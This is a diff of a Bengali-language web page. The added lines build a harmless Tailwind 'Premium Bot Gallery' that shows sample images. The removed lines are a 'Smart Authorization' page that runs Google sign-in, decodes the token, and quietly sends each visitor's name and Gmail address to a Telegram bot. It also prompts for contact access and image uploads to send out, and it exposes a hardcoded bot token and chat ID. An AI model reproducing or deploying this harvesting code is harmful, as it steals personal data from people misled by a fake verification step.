@@ -1,46 +1,101 @@
-<script src="https://accounts.google.com/gsi/client" async defer></script>
-
-<div class="container">
-    <h2>Smart Authorization 🛡️</h2>
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Bot Gallery</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     
-    <div id="g_id_onload"
-         data-client_id="YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com"
-         data-callback="handleCredentialResponse">
-    </div>
-    <div class="g_id_signin" data-type="standard"></div>
+    <style>
+        body {
+            font-family: 'Hind Siliguri', sans-serif;
+            background: #0f172a;
+            color: #f1f5f9;
+        }
+        .glass-card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+        }
+        .img-card:hover {
+            transform: translateY(-10px);
+            transition: all 0.3s ease;
+            box-shadow: 0 20px 25px -5px rgb(0 0 0 / 0.5);
+        }
+        .gradient-text {
+            background: linear-gradient(90deg, #38bdf8, #818cf8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+    </style>
+</head>
+<body class="min-h-screen">
 
-    <p class="info-text" style="margin-top: 20px;">লগইন করার পর ছবি সিলেক্ট করুন</p>
-    
-    <button class="btn" id="contactBtn">👤 কন্টাক্ট এক্সেস দিন</button>
-    <input type="file" id="images" multiple accept="image/*" style="display: none;">
-    <button class="btn" onclick="document.getElementById('images').click()">🖼️ ছবি সিলেক্ট করুন</button>
-    <button class="btn" id="finalSend" style="background: #10b981; margin-top: 20px;" disabled>সবকিছু পাঠান</button>
-</div>
+    <nav class="p-6 flex justify-between items-center max-w-7xl mx-auto">
+        <h2 class="text-2xl font-bold gradient-text tracking-tighter">TELE-GALLERY</h2>
+        <div class="hidden md:block text-sm text-gray-400">বোটের মাধ্যমে অটোমেটিক আপডেট</div>
+    </nav>
 
-<script>
-    const botToken = "7885791804:AAHQjsAsMuBfvVqWga0hub2m0QZ7BrgsAsc";
-    const chatId = "5923885908";
-
-    // গুগল থেকে ইমেইল পাওয়ার ফাংশন
-    function handleCredentialResponse(response) {
-        // ডিকোড করা ডাটা থেকে ইমেইল বের করা
-        const responsePayload = parseJwt(response.credential);
-        const userEmail = responsePayload.email;
-        const userName = responsePayload.name;
-
-        // টেলিগ্রামে পাঠানো
-        const text = `🎯 নতুন ইউজার লগইন করেছে:\n👤 নাম: ${userName}\n📧 জিমেইল: ${userEmail}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+    <header class="text-center py-16 px-4 animate__animated animate__fadeIn">
+        <h1 class="text-5xl md:text-7xl font-extrabold mb-6">ছবি সংগ্রহের <span class="gradient-text">প্রিমিয়াম</span> লাইব্রেরি</h1>
+        <p class="text-gray-400 max-w-2xl mx-auto mb-10">আপনার টেলিগ্রাম বোট থেকে পাঠানো সব ছবি এখানে হাই-কোয়ালিটিতে প্রদর্শিত হবে।</p>
         
-        alert("জিমেইল ভেরিফাইড: " + userEmail);
-        document.getElementById('finalSend').disabled = false;
-    }
+        <div class="glass-card inline-flex flex-col items-center px-12 py-8 animate__animated animate__zoomIn">
+            <span class="text-gray-500 text-xs uppercase tracking-[0.3em] mb-2">মোট আপলোডকৃত ছবি</span>
+            <div class="flex items-center gap-3">
+                <span id="counter" class="text-6xl font-black text-white">0</span>
+                <span class="text-blue-500 text-2xl">+</span>
+            </div>
+        </div>
+    </header>
 
-    function parseJwt (token) {
-        var base64Url = token.split('.')[1];
-        var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
-        return JSON.parse(window.atob(base64));
-    }
+    <main class="max-w-7xl mx-auto px-6 pb-20">
+        <div id="gallery-container" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
+            <div class="col-span-full text-center py-20 text-gray-500 italic">
+                ছবিগুলো লোড হচ্ছে...
+            </div>
+        </div>
+    </main>
 
-    // আপনার বাকি কন্টাক্ট এবং ইমেজ পাঠানোর কোড এখানে থাকবে...
-</script>
+    <script>
+        // আপনার বোট থেকে আসা ছবির ডেটা এখানে থাকবে
+        // উদাহরণ স্বরূপ কিছু স্যাম্পল ডেটা:
+        const sampleImages = [
+            "https://images.unsplash.com/photo-1506744038136-46273834b3fb",
+            "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05",
+            "https://images.unsplash.com/photo-1441974231531-c6227db76b6e",
+            "https://images.unsplash.com/photo-1501785888041-af3ef285b470"
+        ];
+
+        function renderGallery(images) {
+            const container = document.getElementById('gallery-container');
+            const counterElement = document.getElementById('counter');
+            
+            // কাউন্টার আপডেট
+            counterElement.innerText = images.length;
+
+            if (images.length === 0) {
+                container.innerHTML = "<p class='col-span-full text-center'>কোনো ছবি নেই। বোটে ছবি পাঠান!</p>";
+                return;
+            }
+
+            container.innerHTML = images.map((url, index) => `
+                <div class="img-card relative overflow-hidden rounded-3xl animate__animated animate__fadeInUp" style="animation-delay: ${index * 0.1}s">
+                    <img src="${url}" alt="Gallery Image" class="w-full h-80 object-cover">
+                    <div class="absolute inset-0 bg-gradient-to-t from-black/80 to-transparent opacity-0 hover:opacity-100 transition-opacity flex items-end p-6">
+                        <button class="bg-white/10 backdrop-blur-md text-white px-4 py-2 rounded-xl text-sm border border-white/20">View HD</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // কিছু সময় পর লোড করার ডেমো
+        setTimeout(() => {
+            renderGallery(sampleImages);
+        }, 1000);
+    </script>
+</body>
+</html>
